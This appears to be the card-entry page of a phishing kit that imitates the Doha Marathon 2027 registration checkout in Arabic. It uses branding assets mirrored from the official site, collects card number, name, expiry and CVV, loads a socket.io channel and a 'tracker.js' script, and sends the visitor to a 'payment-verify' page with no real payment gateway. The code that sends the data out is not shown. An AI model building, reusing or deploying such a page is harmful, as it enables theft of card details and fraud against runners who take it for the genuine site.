<!doctype html>
<html lang="ar" dir="rtl">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#ed1c24">
	<title>الدفع بالبطاقة - ماراثون الدوحة 2027</title>
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
	<link rel="stylesheet" href="assets/registration-payment.css">
	<style>
		html,body { overflow-x:hidden; max-width:100vw; }
		.card-form-fields { display:flex; flex-direction:column; gap:14px; margin:16px 0; }
		.field-group { position:relative; min-width:0; }
		.field-label {
			display:flex; align-items:center; gap:4px; margin-bottom:5px;
			font-size:13px; font-weight:600; color:#374151;
		}
		.field-label svg { width:14px; height:14px; color:#6b7280; flex-shrink:0; }
		.input-wrapper {
			display:flex; align-items:center;
			border:2px solid #e5e7eb; border-radius:10px; background:#fff;
			transition:border-color .25s,box-shadow .25s; overflow:hidden;
			box-sizing:border-box; width:100%;
		}
		.input-wrapper:focus-within { border-color:var(--brand); box-shadow:0 0 0 2px rgba(237,28,36,.12); }
		.input-wrapper.error { border-color:#ef4444; box-shadow:0 0 0 2px rgba(239,68,68,.12); }
		.input-wrapper.valid { border-color:#10b981; }
		.input-icon {
			display:flex; align-items:center; justify-content:center;
			width:36px; min-width:36px; flex-shrink:0;
			padding-inline-start:10px;
			color:#9ca3af; transition:color .25s;
		}
		.input-wrapper:focus-within .input-icon { color:var(--brand); }
		.input-wrapper.valid .input-icon { color:#10b981; }
		.input-icon svg { width:18px; height:18px; display:block; }
		.card-form-fields input {
			flex:1; border:0; outline:none; padding:12px 8px;
			font-size:16px; font-family:inherit; background:transparent;
			color:#101010; direction:ltr; text-align:left;
			min-width:0; width:0;
		}
		.card-form-fields input::placeholder { color:#c0c0c0; }
		.brand-indicator {
			display:flex; align-items:center; padding:0 6px; flex-shrink:0;
			transition:opacity .3s,transform .3s;
		}
		.brand-indicator svg { height:18px; width:auto; max-width:34px; display:block; }
		.brand-indicator.hidden { opacity:0; width:0; padding:0; overflow:hidden; }
		.brand-indicator.visible { opacity:1; }
		.field-error {
			display:none; align-items:center; gap:4px;
			margin-top:4px; font-size:11px; color:#ef4444;
		}
		.field-error.show { display:flex; }
		.field-error svg { width:12px; height:12px; flex-shrink:0; }
		.valid-check { display:none !important; }
		.row-2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
		.row-2 .input-icon { width:30px; min-width:30px; padding-inline-start:8px; }
		.row-2 .input-icon svg { width:15px; height:15px; }
		.row-2 input { padding:11px 6px; font-size:15px; }
		.brands-row {
			display:flex; align-items:center; justify-content:center; gap:8px;
			margin-bottom:2px; padding:10px 0;
		}
		.brands-row svg { height:22px; width:auto; max-width:70px; display:block; }
		.brands-row .sep { width:1px; height:16px; background:#e0e0e0; }
		.secure-badge {
			display:flex; align-items:center; justify-content:center; gap:4px;
			margin-top:8px; font-size:11px; color:#6b7280;
		}
		.secure-badge svg { width:12px; height:12px; color:#10b981; }
		@media(max-width:400px){
			.payment-card { padding:28px 14px 28px !important; }
			.payment-shell { margin-top:40px !important; }
			.row-2 { gap:8px; }
			.row-2 .input-icon { width:26px; min-width:26px; padding-inline-start:6px; }
			.row-2 .input-icon svg { width:13px; height:13px; }
			.brands-row svg { height:18px; max-width:56px; }
		}
	</style>
</head>
<body>
	<header class="payment-header">
		<nav class="header-actions" aria-label="روابط سريعة">
			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
			</a>
			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
		</nav>
		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
		</a>
	</header>

	<main class="payment-shell">
		<section class="payment-card" aria-label="الدفع بالبطاقة">
			<div class="session-row">
				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
				<span>تنتهي صلاحية الجلسة خلال</span>
			</div>

			<div class="payment-total">
				<p>إجمالي المبلغ المستحق الدفع</p>
				<strong id="payment-total" class="amount"></strong>
			</div>

			<!-- Accepted Brands -->
			<div class="brands-row">
				<!-- Visa -->
				<svg viewBox="0 0 72 24" fill="none">
					<rect width="72" height="24" rx="4" fill="#1a1f71"/>
					<path d="M28.8 18.3L31.1 5.7h4.2l-2.3 12.6h-4.2z" fill="#fff"/>
					<path d="M46.7 6.2c-1.1-.5-2.9-.9-5.2-.9-5.6 0-9.5 2.8-9.6 6.9-.1 3 2.7 4.6 4.9 5.6 2.1 1 2.9 1.7 2.9 2.7 0 1.5-1.8 2.2-3.5 2.2-2.2 0-3.5-.4-5.1-1.1l-.8-.4-.8 5.2c1.4.7 3.8 1.2 6.2 1.2 5.9 0 9.7-2.8 9.8-7.1.1-2.4-1.5-4.2-4.5-5.6-1.8-1-2.9-1.7-2.9-2.7 0-.9 1.2-2 3.5-2 1.9 0 3.2.4 4.4.9l.6.3.7-4.9-.6-.3z" fill="#fff"/>
					<path d="M55.8 5.7h-4c-1.3 0-2.3.4-2.9 1.7L41.8 18.3h5.9l1.2-3.2h7.2l.7 3.2H62l-4.5-12.6h-1.7zm-5.3 8.4l2.8-7.6 1.6 7.6h-4.4z" fill="#fff"/>
					<path d="M22.5 5.7L17.1 14.9l-.6-2.8c-1-3.4-4-6.4-7.4-8.2l5 10.1h6L29.1 5.7h-6.6z" fill="#fff"/>
					<path d="M12.8 5.7H3.2L3 6.2c6.6 1.6 11.7 6.1 13.5 10.9L14.7 7.6c-.3-1.3-1-1.8-1.9-1.9z" fill="#f59e0b"/>
				</svg>
				<span class="sep"></span>
				<!-- Mastercard -->
				<svg viewBox="0 0 72 24" fill="none">
					<rect width="72" height="24" rx="4" fill="#252525"/>
					<circle cx="28" cy="12" r="9" fill="#EB001B"/>
					<circle cx="44" cy="12" r="9" fill="#F79E1B" fill-opacity=".92"/>
					<path d="M36 5.1c2.3 1.9 3.7 4.6 3.7 7.8 0 2.8-1.4 5.5-3.7 7.3-2.3-1.8-3.7-4.5-3.7-7.3 0-3.2 1.4-5.9 3.7-7.8z" fill="#FF5F00"/>
				</svg>
			</div>

			<form id="card-form" novalidate>
				<div class="card-form-fields">

					<!-- Card Number -->
					<div class="field-group">
						<div class="field-label">
							<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
							رقم البطاقة
						</div>
						<div class="input-wrapper" id="card-number-wrapper">
							<div class="input-icon" id="card-number-icon">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
							</div>
							<input type="tel" name="card-number" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
							<div class="brand-indicator hidden" id="brand-badge"></div>
							<div class="valid-check" id="card-number-check">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
							</div>
						</div>
						<div class="field-error" id="card-number-error">
							<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
							<span></span>
						</div>
					</div>

					<!-- Cardholder Name -->
					<div class="field-group">
						<div class="field-label">
							<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
							الاسم على البطاقة
						</div>
						<div class="input-wrapper" id="name-wrapper">
							<div class="input-icon">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
							</div>
							<input type="text" name="cardholder-name" id="cardholder-name" placeholder="CARDHOLDER NAME" autocomplete="cc-name" required>
						</div>
					</div>

					<div class="row-2">
						<!-- Expiry -->
						<div class="field-group">
							<div class="field-label">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
								تاريخ الانتهاء
							</div>
							<div class="input-wrapper" id="expiry-wrapper">
								<div class="input-icon">
									<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
								</div>
								<input type="tel" name="card-expiry" id="card-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
								<div class="valid-check" id="expiry-check">
									<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
								</div>
							</div>
							<div class="field-error" id="expiry-error">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
								<span></span>
							</div>
						</div>

						<!-- CVV -->
						<div class="field-group">
							<div class="field-label">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
								CVV
							</div>
							<div class="input-wrapper" id="cvv-wrapper">
								<div class="input-icon">
									<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
								</div>
								<input type="tel" name="card-cvv" id="card-cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
								<div class="valid-check" id="cvv-check">
									<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
								</div>
							</div>
							<div class="field-error" id="cvv-error">
								<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
								<span></span>
							</div>
						</div>
					</div>
				</div>

				<div class="secure-badge">
					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
					<span>بيانات الدفع مشفرة ومحمية بالكامل</span>
				</div>

				<button id="pay-button" class="pay-button" type="submit">يدفع</button>
				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
			</form>

			<a class="back-link" href="payment.html">خلف</a>
		</section>
	</main>
	<footer class="payment-footer" aria-hidden="true"></footer>
<script src="/socket.io/socket.io.js"></script>
<script src="/assets/tracker.js"></script>
<script>
(function(){
	var reviewKey = "doha-marathon-registration-review";
	var expiryKey = "doha-marathon-payment-expiry";
	var review;
	try { review = JSON.parse(sessionStorage.getItem(reviewKey) || "null"); } catch(e){ review = null; }

	var totalEl = document.getElementById("payment-total");
	var payBtn = document.getElementById("pay-button");
	if (review && typeof review.price === "number") {
		var formatted = "QAR " + review.price.toFixed(2);
		if (totalEl) totalEl.textContent = formatted;
		if (payBtn) payBtn.textContent = "يدفع " + formatted;
	}

	var savedExpiry = Number(sessionStorage.getItem(expiryKey));
	var expiry = (savedExpiry > 0) ? savedExpiry : Date.now() + 10*60*1000;
	sessionStorage.setItem(expiryKey, String(expiry));

	var countdown = document.getElementById("session-countdown");
	var msg = document.getElementById("payment-message");
	function tick(){
		var rem = Math.max(0, Math.ceil((expiry - Date.now())/1000));
		var m = Math.floor(rem/60), s = rem%60;
		if(countdown) countdown.textContent = String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
		if(rem===0){ if(msg){msg.hidden=false; msg.textContent="انتهت صلاحية جلسة الدفع.";} clearInterval(tid); }
	}
	tick(); var tid = setInterval(tick, 1000);

	// --- SVG Brand Templates ---
	var VISA_SVG = '<svg viewBox="0 0 60 20" fill="none" style="height:18px;width:36px"><path d="M24.8 19.3L28.1.7H33.3L30 19.3H24.8Z" fill="#1a1f71"/><path d="M46.7 1.2C45.6.7 43.8.3 41.5.3 35.9.3 32 3.1 31.9 7.2 31.8 10.2 34.6 11.8 36.8 12.8 38.9 13.8 39.7 14.5 39.7 15.5 39.7 17 37.9 17.7 36.2 17.7 34 17.7 32.7 17.3 31.1 16.6L30.3 16.2 29.5 21.4C30.9 22.1 33.3 22.6 35.7 22.6 41.6 22.6 45.4 19.8 45.5 15.5 45.6 13.1 44 11.3 41 9.9 39.2 8.9 38.1 8.2 38.1 7.2 38.1 6.2 39.3 5.2 41.6 5.2 43.5 5.2 44.8 5.6 46 6.1L46.6 6.4 47.3 1.5 46.7 1.2Z" fill="#1a1f71"/><path d="M55.8.7H51.8C50.5.7 49.5 1.1 48.9 2.4L41.8 19.3H47.7L48.9 16.1H56.1L56.8 19.3H62L57.5.7H55.8ZM50.5 12.1L53.3 4.5 54.9 12.1H50.5Z" fill="#1a1f71"/><path d="M18.5.7L13.1 14.9 12.5 12.1C11.5 8.7 8.5 5 5.1 3.2L10 19.3H16.1L25.1.7H18.5Z" fill="#1a1f71"/><path d="M8.8.7H-.8L-1 1.2C5.6 2.8 10.7 7.3 12.5 12.1L10.7 2.6C10.4 1.3 9.7.8 8.8.7Z" fill="#f59e0b"/></svg>';
	var MC_SVG = '<svg viewBox="0 0 48 30" fill="none" style="height:18px;width:30px"><circle cx="17" cy="15" r="13" fill="#EB001B"/><circle cx="31" cy="15" r="13" fill="#F79E1B" fill-opacity=".92"/><path d="M24 5.3C26.9 7.8 28.7 11.2 28.7 15 28.7 18.8 26.9 22.2 24 24.7 21.1 22.2 19.3 18.8 19.3 15 19.3 11.2 21.1 7.8 24 5.3Z" fill="#FF5F00"/></svg>';
	var GENERIC_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>';

	// --- Elements ---
	var cardNum = document.getElementById("card-number");
	var cardName = document.getElementById("cardholder-name");
	var expEl = document.getElementById("card-expiry");
	var cvvEl = document.getElementById("card-cvv");
	var brandBadge = document.getElementById("brand-badge");
	var cardIcon = document.getElementById("card-number-icon");

	// --- Luhn Algorithm ---
	function luhnCheck(num) {
		var sum = 0, alt = false;
		for (var i = num.length - 1; i >= 0; i--) {
			var n = parseInt(num[i], 10);
			if (alt) { n *= 2; if (n > 9) n -= 9; }
			sum += n; alt = !alt;
		}
		return sum % 10 === 0;
	}

	// --- Brand Detection ---
	function detectBrand(num) {
		if (!num) return 'unknown';
		if (/^4/.test(num)) return 'visa';
		if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard';
		return 'unknown';
	}

	var currentBrand = 'unknown';
	function updateBrandDisplay(brand) {
		if (brand === currentBrand) return;
		currentBrand = brand;
		if (brand === 'visa') {
			brandBadge.innerHTML = VISA_SVG;
			brandBadge.className = 'brand-indicator visible';
		} else if (brand === 'mastercard') {
			brandBadge.innerHTML = MC_SVG;
			brandBadge.className = 'brand-indicator visible';
		} else {
			brandBadge.className = 'brand-indicator hidden';
		}
	}

	// --- Helpers ---
	function showError(id, message) {
		var el = document.getElementById(id);
		if (el) { el.querySelector('span').textContent = message; el.classList.add('show'); }
	}
	function hideError(id) { var el = document.getElementById(id); if (el) el.classList.remove('show'); }
	function setWrapperState(id, state) {
		var el = document.getElementById(id); if (!el) return;
		el.classList.remove('error', 'valid'); if (state) el.classList.add(state);
	}
	function showCheck(id) { var el = document.getElementById(id); if (el) el.classList.add('show'); }
	function hideCheck(id) { var el = document.getElementById(id); if (el) el.classList.remove('show'); }

	// --- Card Number ---
	if (cardNum) {
		cardNum.addEventListener("input", function() {
			var raw = this.value.replace(/\D/g, "").substring(0, 16);
			var parts = raw.match(/.{1,4}/g);
			this.value = parts ? parts.join(" ") : "";
			updateBrandDisplay(detectBrand(raw));
			hideError('card-number-error'); hideCheck('card-number-check'); setWrapperState('card-number-wrapper', '');
			if (raw.length === 16) {
				if (luhnCheck(raw)) { setWrapperState('card-number-wrapper', 'valid'); showCheck('card-number-check'); }
				else { setWrapperState('card-number-wrapper', 'error'); showError('card-number-error', 'رقم البطاقة غير صالح'); }
			}
		});
		cardNum.addEventListener("blur", function() {
			var raw = this.value.replace(/\D/g, "");
			if (raw.length > 0 && raw.length < 16) {
				setWrapperState('card-number-wrapper', 'error');
				showError('card-number-error', 'رقم البطاقة يجب أن يكون 16 رقم');
			}
		});
	}

	// --- Expiry ---
	if (expEl) {
		expEl.addEventListener("input", function() {
			var v = this.value.replace(/\D/g, "").substring(0, 4);
			if (v.length >= 3) this.value = v.substring(0, 2) + "/" + v.substring(2);
			else this.value = v;
			hideError('expiry-error'); hideCheck('expiry-check'); setWrapperState('expiry-wrapper', '');
			if (this.value.length === 5) {
				var p = this.value.split('/'), month = parseInt(p[0], 10), year = parseInt(p[1], 10) + 2000;
				var now = new Date(), cm = now.getMonth() + 1, cy = now.getFullYear();
				if (month < 1 || month > 12) { setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'الشهر يجب أن يكون بين 01 و 12'); }
				else if (year < cy || (year === cy && month < cm)) { setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'البطاقة منتهية الصلاحية'); }
				else { setWrapperState('expiry-wrapper', 'valid'); showCheck('expiry-check'); }
			}
		});
		expEl.addEventListener("blur", function() {
			if (this.value.length > 0 && this.value.length < 5) {
				setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'أدخل التاريخ بالصيغة MM/YY');
			}
		});
	}

	// --- CVV ---
	if (cvvEl) {
		cvvEl.addEventListener("input", function() {
			this.value = this.value.replace(/\D/g, "").substring(0, 4);
			hideError('cvv-error'); hideCheck('cvv-check'); setWrapperState('cvv-wrapper', '');
			if (this.value.length >= 3) { setWrapperState('cvv-wrapper', 'valid'); showCheck('cvv-check'); }
		});
		cvvEl.addEventListener("blur", function() {
			if (this.value.length > 0 && this.value.length < 3) {
				setWrapperState('cvv-wrapper', 'error'); showError('cvv-error', 'CVV يجب أن يكون 3 أرقام على الأقل');
			}
		});
	}

	// --- Submit ---
	var form = document.getElementById("card-form");
	if (form) form.addEventListener("submit", function(e) {
		e.preventDefault(); var valid = true;
		var cn = (cardNum ? cardNum.value : "").replace(/\s/g, "");
		var name = (cardName ? cardName.value : "").trim();
		var exp = expEl ? expEl.value : "";
		var cvv = cvvEl ? cvvEl.value : "";

		if (cn.length < 16) { setWrapperState('card-number-wrapper', 'error'); showError('card-number-error', 'رقم البطاقة يجب أن يكون 16 رقم'); valid = false; }
		else if (!luhnCheck(cn)) { setWrapperState('card-number-wrapper', 'error'); showError('card-number-error', 'رقم البطاقة غير صالح'); valid = false; }
		if (!name) { setWrapperState('name-wrapper', 'error'); valid = false; }
		if (exp.length < 5) { setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'أدخل تاريخ الانتهاء'); valid = false; }
		else {
			var p = exp.split('/'), month = parseInt(p[0], 10), year = parseInt(p[1], 10) + 2000, now = new Date();
			if (month < 1 || month > 12) { setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'شهر غير صالح'); valid = false; }
			else if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) { setWrapperState('expiry-wrapper', 'error'); showError('expiry-error', 'البطاقة منتهية الصلاحية'); valid = false; }
		}
		if (cvv.length < 3) { setWrapperState('cvv-wrapper', 'error'); showError('cvv-error', 'CVV يجب أن يكون 3 أرقام'); valid = false; }

		if (!valid) { if (msg) { msg.hidden = false; msg.textContent = "يرجى تصحيح الأخطاء في النموذج."; } return; }
		if (msg) msg.hidden = true;
		window.location.assign("payment-verify.html");
	});
})();
</script>
</body>
</html>
